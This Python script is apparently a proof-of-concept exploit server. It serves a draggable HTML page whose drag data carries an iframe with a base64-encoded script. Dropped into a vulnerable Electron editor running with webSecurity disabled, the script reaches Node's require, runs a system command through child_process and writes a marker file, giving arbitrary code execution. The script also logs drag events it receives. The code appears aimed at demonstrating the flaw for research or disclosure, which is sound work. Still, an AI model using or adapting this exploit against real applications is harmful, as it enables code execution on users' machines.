#!/usr/bin/env python3
import base64
import json
import os
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

PORT = int(os.environ.get("DRAG_HTTP_PORT", "18765"))
LOG_PATH = os.environ.get("HTTP_LOG_PATH", "/tmp/native-html-drag-http.jsonl")

def append(obj):
    obj = {"time": time.time(), **obj}
    with open(LOG_PATH, "a", encoding="utf-8") as f:
        f.write(json.dumps(obj, sort_keys=True) + "\n")

# The dropped data: iframe data URL is preserved by Chromium's editable-content
# sanitizer. webSecurity:false lets this child reach the privileged top world.
DIRECT_DOC = r'''<!doctype html><meta charset="utf-8"><script>
try {
  const fs = top.require('fs');
  const cp = top.require('child_process');
  const id = cp.execFileSync('/usr/bin/id', {encoding:'utf8'}).trim();
  const marker = top.process.env.NATIVE_DRAG_MARKER || '/tmp/native-html-drag-rce';
  fs.writeFileSync(marker,
    'DIRECT_TOP_REQUIRE_ACE=1\\n' + id + '\\nNODE=' + top.process.versions.node +
    '\\nELECTRON=' + top.process.versions.electron + '\\nTOP_URL=' + top.location.href + '\\n');
  top.document.title = 'DIRECT_TOP_REQUIRE_ACE';
} catch (e) {
  try { top.document.title = 'DIRECT_TOP_REQUIRE_ERROR:' + String(e); } catch (_) {}
}
</script>'''
DIRECT_B64 = base64.b64encode(DIRECT_DOC.encode()).decode()
SOURCE = r'''<!doctype html><meta charset="utf-8">
<title>DRAG_SOURCE_READY</title>
<style>
html,body { margin:0; height:100%; background:#f1f5f9; font:20px system-ui; overflow:hidden }
#drag { position:fixed; left:30px; top:105px; width:320px; height:300px;
 display:flex; align-items:center; justify-content:center; text-align:center;
 color:white; background:#7c3aed; border:8px solid #4c1d95; border-radius:25px;
 user-select:none; -webkit-user-drag:element; }
</style>
<div id="drag" draggable="true">HTML-only native drag source<br>Drag to the large green editor input</div>
<script>
const payload = '<iframe id="pwnframe" src="data:text/html;base64,__DIRECT_B64__" style="width:420px;height:260px;border:3px solid red"></iframe>';
const drag = document.getElementById('drag');
drag.addEventListener('dragstart', ev => {
  ev.dataTransfer.clearData();
  ev.dataTransfer.setData('text/html', payload);
  ev.dataTransfer.effectAllowed = 'copy';
  const types = Array.from(ev.dataTransfer.types);
  document.title = 'DRAGSTART:' + types.join(',');
  navigator.sendBeacon('/log?event=dragstart&types=' + encodeURIComponent(JSON.stringify(types)));
});
drag.addEventListener('dragend', ev => {
  navigator.sendBeacon('/log?event=dragend&effect=' + encodeURIComponent(ev.dataTransfer.dropEffect));
});
</script>'''.replace('__DIRECT_B64__', DIRECT_B64)

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        p = urllib.parse.urlparse(self.path)
        q = urllib.parse.parse_qs(p.query)
        append({"path": p.path, "host": self.headers.get("Host"), "query": q})
        if p.path in ("/", "/source"):
            body = SOURCE.encode()
        elif p.path == "/log":
            body = b"ok"
        else:
            self.send_response(404); self.end_headers(); return
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers(); self.wfile.write(body)
    def log_message(self, fmt, *args):
        pass

append({"event":"server-start", "port":PORT, "directFrameBytes":len(DIRECT_DOC)})
print(f"READY http://127.0.0.1:{PORT}/source", flush=True)
ThreadingHTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
